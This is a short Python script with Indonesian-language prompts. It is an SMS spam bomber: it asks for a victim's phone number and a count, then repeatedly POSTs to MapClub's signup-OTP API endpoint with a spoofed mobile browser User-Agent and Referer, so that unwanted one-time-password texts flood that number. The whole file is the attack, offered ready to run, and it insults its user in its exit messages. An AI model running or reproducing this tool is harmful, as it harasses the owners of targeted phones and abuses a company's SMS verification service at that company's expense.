import os,sys,requests,time
from requests import post

logo = ("""
       { Coded : Aleeju }\n""")
def aleeju():
  print(logo)
  print('example: 08199xxxx')
  print('limit spam : 10')
  no = input ('masukkan nomer:')
  jumlah = int(input ('jumlah spam:'))
  aleju = {
'Connection': 'keep-alive',
'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Referer': 'https://www.mapclub.com/en/user/signup',
  }

  dat = {
  'phone':no,
  }

  for x in range(jumlah):
    time.sleep(5)
    sms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=aleju)
    if 'error' in sms.text:
      print(no,'spam gagal')
    else:
      print(no,'spam success')

def kns():
  d = input('ingin spam lagi? [y/n]')
  if d=='y' or d=='Y':
    aleeju()
  elif d=='n' or d=='N':
    print('bye goblok! :)')
    os.sys.exit()
  else:
    print('yang bener TOLOL !')
    os.sys.exit()

if __name__=='__main__':
  aleeju()
  kns()